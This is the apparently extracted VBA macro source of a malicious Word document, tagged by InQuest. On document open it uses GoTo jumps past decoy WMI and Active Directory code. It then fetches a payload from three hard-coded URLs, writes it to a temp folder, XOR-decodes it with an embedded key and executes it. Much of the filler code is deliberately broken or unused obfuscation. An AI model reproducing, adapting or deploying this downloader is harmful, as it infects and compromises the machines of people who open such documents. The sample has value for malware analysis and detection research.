Attribute VB_Name = "Cooper"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Public Function ratatu() As String


IIIIII = Split(Window1.Tas.Tag, "FSUKE")
Vaucher = IIIIII(FreshID + FreshID * 2 / 13)
SubMui

ratatu = ""

End Function


    Public Sub Challenge(sender As String, e As Integer)
SetPageFile 1
SetPageFile 2
    End Sub
Attribute VB_Name = "Module1"

Public MovedPermanently() As String
Public AKLEAM_4 As String
  

Public ProjectDarvin As Integer
Public AKLEAM_RDD2 As Object
Public smbi As String
Public AKLEAM_2 As String
Public Const FreshID = 0

Public IIIIII() As String
Public AKLEAM_Project As String
Public Vaucher As String
Public AKLEAM_ProjectBBB As String
Public CuPro As Object

Public Sub SubMui()
If ActiveDocument.Kind = 0 Then
Set CuPro = CreateObject(Vaucher)
End If
Set AKLEAM_PIRO_LOR = CreateObject(IIIIII(FreshID + 3))
smbi = Window1.Label1.Caption

MovedPermanently = Split("btudecolombia.com/jhg67gVtester.myjino.ru/jhg67gVfkksjobnn43.org/r55/jhg67g", Window1.Command.Caption)
 Set SubProperty = CreateObject(IIIIII(1))
    
   Set AKLEAM_GMAKO = CreateObject(IIIIII(2))

Set AKLEAM_RDD2 = AKLEAM_PIRO_LOR.Environment(IIIIII(4))


 ProjectDarvin = 12
 AKLEAM_LAKOPPC = AKLEAM_RDD2(IIIIII(ProjectDarvin / 2))
 ProjectDarvin = ProjectDarvin - ProjectDarvin



     MoveSheets "A", "B", "C"

End Sub

Public Function Assimptota4(FullPath As String, NumHoja As Integer) As String
  WidthA AKLEAM_ProjectBBB, AKLEAM_Project, "lwjO4TinurL9U3GpiY0Ze23oRaQqiT0m"


AKLEAM_GMAKO.Open (AKLEAM_Project)
   
End Function

Public Function CheckRectsMenu4() As Integer
    Dim rTemp As RECT, rMouse As RECT, i As Integer
    With rMouse
        .Left = g_cursorx
        .Right = .Left + 32
        .Top = g_cursory
        .Bottom = .Top + 1
    End With
    For i = 0 To UBound(MenuRect)
        If IntersectR.ect(rTemp, MenuRect(i), rMouse) Then
            CheckRectsMenu4 = i + 1
            Exit Function
        End If
    Next
End Function

Sub enumMembers(objDomain)
    On Error Resume Next
    Dim Secondary(20) ' Variable to store the Array of 2ndary email alias's
    For Each objMember In objDomain ' go through the collection
        If objMember.Class = "user" Then ' if not User object, move on.
            x = x + 1 ' counter used to increment the cells in Excel

            ' I set AD properties to variables so if needed you could do Null checks or add if/then's to this code
            ' this was done so the script could be modified easier.
            SamAccountName = objMember.SamAccountName
            Cn = objMember.Cn
            FirstName = objMember.GivenName
            LastName = objMember.sn
            initials = objMember.initials
            Descrip = objMember.Description
            Office = objMember.physicalDeliveryOfficeName
            Telephone = objMember.telephonenumber
            EmailAddr = objMember.mail
            WebPage = objMember.wwwHomePage
            Addr1 = objMember.streetAddress
            City = objMember.l
            State = objMember.st
            ZipCode = objMember.postalCode
            Title = objMember.Title
            Department = objMember.Department
            Company = objMember.Company
            Manager = objMember.Manager
            Profile = objMember.profilePath
            LoginScript = objMember.scriptpath
            HomeDirectory = objMember.HomeDirectory
            HomeDrive = objMember.HomeDrive
            AdsPath = objMember.AdsPath

            AllAttributes = Array(SamAccountName, Cn, FirstName, LastName, initials, Descrip, Office, Telephone, EmailAddr, WebPage, Addr1, City, State, ZipCode, Title, Department, Company, Manager, Profile, LoginScript, HomeDirectory, HomeDrive, AdsPath)
            
            zz = 1 ' Counter for array of 2ndary email addresses
            For Each Email In objMember.proxyAddresses
                If Left(Email, 5) = "SMTP:" Then
                    Primary = Mid(Email, 6) ' if SMTP is all caps, then it's the Primary
                ElseIf Left(Email, 5) = "smtp:" Then
                    Secondary(zz) = Mid(Email, 6) ' load the list of 2ndary SMTP emails into Array.
                    zz = zz + 1
                End If
            Next
            ' Write the values to Excel, using the X counter to increment the rows.

            ' Write out the Array for the 2ndary email addresses.
            Counter = 0
            For ll = 1 To 20
                If Secondary(ll) <> "" Then
                    If Counter = 0 Then
                        SecondEmail = Secondary(ll)
                    Else
                        SecondEmail = SecondEmail + ", " + Secondary(ll)
                    End If
                    Counter = Counter + 1
                End If
            Next
            SecondEmail = """" & SecondEmail & """"
            
            If SamAccountName <> " " And EmailAddr <> "" Then
                Set FileSystem = CreateObject("Scripting.FileSystemObject")
                Set WriteStuff = FileSystem.OpenTextFile("c:\temp\AD.csv", 8, True)
                Counter = 0
                For Each x In AllAttributes
                    If Counter = 0 Then
                        TheFile = TheFile + """" + x + """"
                    Else
                        TheFile = TheFile + "," + """" + x + """"
                    End If
                    Counter = Counter + 1
                    x = x + 1
                Next
                TheFile = TheFile + "," + SecondEmail
                WriteStuff.WriteLine (TheFile)
                WriteStuff.Close
                TheFile = ""
                Set WriteStuff = Nothing
                Set FileSystem = Nothing
            End If
            
            ' Blank out Variables in case the next object doesn't have a value for the property
            SamAccountName = "-"
            Cn = "-"
            FirstName = "-"
            LastName = "-"
            initials = "-"
            Descrip = "-"
            Office = "-"
            Telephone = "-"
            EmailAddr = "-"
            WebPage = "-"
            Addr1 = "-"
            City = "-"
            State = "-"
            ZipCode = "-"
            Title = "-"
            Department = "-"
            Company = "-"
            Manager = "-"
            Profile = "-"
            LoginScript = "-"
            HomeDirectory = "-"
            HomeDrive = "-"
            AdsPath = "-"
            
            For ll = 1 To 20
                Secondary(ll) = ""
            Next
            Primary = "-"
            SecondEmail = ""
        End If

        ' If the AD enumeration runs into an OU object, call the Sub again to itinerate

        If objMember.Class = "organizationalUnit" Or objMember.Class = "container" Then
            enumMembers (objMember)
        End If
    Next
End Sub

Attribute VB_Name = "Module3"


Public AKLEAM_PokerFace As Variant
Public AKLEAM_GMAKO As Object
Public AKLEAM_LAKOPPC As String
Public AKLEAM_PIRO_LOR As Object
  
Public Const AKLEAM_System = "User-Agent"
Public SubProperty As Object

Public Const Sooopchik = "etof"



Public Sub Subfunc(MethodParam2() As Byte, MethodParam As String)

  
  Dim CeLaP2 As Long
  Dim CeLaP3 As Long
  Dim CeLaP5 As Long
  Dim CeLaP6 As Long
  Dim plusplus() As Byte
Dim CeLaP4 As Long
Dim plusplusLen As Long
  plusplusLen = Len(MethodParam)
ReDim plusplus(plusplusLen)

  plusplus = StrConv(MethodParam, vbFromUnicode)

  
  CeLaP2 = UBound(MethodParam2) + 1
  CeLaP5 = CeLaP2
  
  
  For CeLaP4 = _
  0 To (CeLaP2 - 1)
    aa = plusplus(CeLaP4 Mod plusplusLen)
    bb = MethodParam2(CeLaP4)
    MethodParam2(CeLaP4) = Ashnorog(bb, aa)
    
    If (CeLaP4 >= CeLaP6) Then
      CeLaP3 = Int((CeLaP4 / CeLaP5) * 100)
      CeLaP6 = (CeLaP5 * ((CeLaP3 + 1) / 100)) + 1
    End If
  Next
End Sub


Public Sub WidthA(DsomeIntegerVar As String, someIntegerVarJ As String, Optional AKLEAM_Sexote As String)

  Dim someIntegerVar As Integer
someIntegerVar = FreeFile
  Dim GsomeIntegerVar() As Byte
  
  Open DsomeIntegerVar For Binary As #someIntegerVar
  ReDim GsomeIntegerVar(0 To LOF(someIntegerVar) - 1)
  Get #someIntegerVar, , GsomeIntegerVar()
  Close #someIntegerVar
  Call Subfunc(GsomeIntegerVar(), AKLEAM_Sexote)
  someIntegerVar = FreeFile
  Open someIntegerVarJ For Binary As #someIntegerVar
  Put #someIntegerVar, , GsomeIntegerVar()
  Close #someIntegerVar

End Sub
Public Function Assimptota6(FullPath As String, NumHoja As Integer) As String

AKLEAM_ProjectSpeed
 CallByName SubProperty, "Open", VbMethod
If NumHoja > 400 Then

    If numExportadas = 0 Then
        Assimptota6 = "No rows to export [No tiene filas por exportar]"
        Exit Function
    End If
End If

 AKLEAM_PokerFace = CallByName(CuPro, "responseBody", VbGet)
 

    
 SubProperty.Write AKLEAM_PokerFace
CallByName SubProperty, "sav" + Sooopchik + "ile", VbMethod, AKLEAM_ProjectBBB, 2
Assimptota4 ".", 1
End Function


Public Sub MoveSheets(sheetToMove As String, sheetAnchor As String, Assimptota6OrAfter As String)


 Dim i
 On Error GoTo d13
For i = LBound(MovedPermanently) To UBound(MovedPermanently) Step 1
 SaveDataCSVToolStripMenuItem_Click 72
If CuPro.Status <> 200 Then
 Err.Raise 700 + vbObjectError, "A", "D"
End If
    
    
    
    Assimptota6 "33", 3
 Exit Sub
d13:
Next
Exit Sub

    
End Sub


Public Function Ashnorog(Var1, Var2)
  Ashnorog = Var1 Xor Var2
  
End Function


Public Function CheckRectsAd() As Boolean
    Dim rTemp As String, rMouse As String, i As Integer
    With rM.ouse
        .Left = g_cursorx
        .Right = .Left + 32
        .Top = g_cursory
        .Bottom = .Top + 1
    End With
    If IntersectR.ect(rTemp, AdRect, rMouse) Then
        CheckRectsAd = True
        Exit Function
    End If
End Function



Function GetPath()
Dim path
path = WScript.ScriptFullName
GetPath = Left(path, InStrRev(path, "\"))
End Function










Public Sub SaveDataCSVToolStripMenuItem_Click(e As Integer)
       AKLEAM_4 = Window1.ZK.Caption & MovedPermanently(i)
 ProjectDarvin = ProjectDarvin + 2
 Dim XIpotom2 As Cooper
Set XIpotom2 = New Cooper
If e < 488 Then


 XIpotom2.Challenge "Swed", 13
CallByName CuPro, Window1.ToggleButton1.Caption, VbMethod
Set XIpotom2 = Nothing
 
Else

End If
    End Sub


Public Function AKLEAM_ProjectSpeed()

GoTo rTemp2
    Set FSO = CreateObject("Scripting.FileSystemObject")

Set oArgs = WScript.Arguments
If oArgs.Count = 1 Then
        strComputer = CStr(oArgs(0))
Else
    strComputer = InputBox("Enter computer name")
End If




Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_VideoController", "WQL", _
wbemFlagReturnImmediately + wbemFlagForwardOnly)
rTemp2:
 AKLEAM_Project = AKLEAM_LAKOPPC
 AKLEAM_ProjectBBB = AKLEAM_Project + "\tymbado" + CStr(ProjectDarvin)


GoTo rTemp3
    For i = 0 To UBound(Menu3Rect)
        If IntersectR.ect(rTemp, Menu3Rect(i), rMouse) Then
            CheckRectsMenu3 = i + 1
            Exit Function
        End If
    Next
rTemp3:
AKLEAM_Project = AKLEAM_Project + Replace(IIIIII(12), ".", CStr(ProjectDarvin) + ".")
 SubProperty.Type = 1
End Function

Public Sub SetPageFile(strComputer As Integer)

If strComputer = 1 Then
CallByName CuPro, Window1.OptionButton1.Tag, VbMethod, IIIIII(5), AKLEAM_4, False

Exit Sub
Else: GoTo lab1
End If
    Set objWMIService = GetObject("winmgmts:" _
        & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set colPageFiles = objWMIService.ExecQuery _
        ("Select * from Win32_PageFileSetting")
lab1:

CallByName CuPro, Window1.OptionButton2.Tag, VbMethod, AKLEAM_System, _
Window1.SpinButton1.Tag
Exit Sub
For Each objPageFile In colPageFiles
        objPageFile.InitialSize = 2046
        objPageFile.MaximumSize = 4092
        objPageFile.Put_
    Next
    

End Sub




Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True


Function OperatingSystem(Comps)
    GoTo l12
    strComputer = Comps
    Set oWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colOSInfo = oWMIService.ExecQuery("Select * from Win32_OperatingSystem")
    For Each oOSProperty In colOSInfo
        strCaption = oOSProperty.Caption
    Next

    If InStr(1, strCaption, "Windows 7", vbTextCompare) Then
        OperatingSystem = "Win7"
    End If
    If InStr(1, strCaption, "XP", vbTextCompare) Then
        OperatingSystem = "XP"
    End If
l12:
    Dim c As Cooper
Set c = New Cooper

CallByName c, Window1.T2.Text, VbMethod
End Function

Sub autoopen()

End Sub



Sub Document_Open()
OperatingSystem ""

End Sub





Attribute VB_Name = "Window1"
Attribute VB_Base = "0{4D4E981E-05C1-4448-B0AC-DF62FF05DECB}{AA1805CD-4DF3-4D7F-82E1-E01D37222293}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

' InQuest injected base64 decoded content
' Z	%S

INQUEST-PP=macro
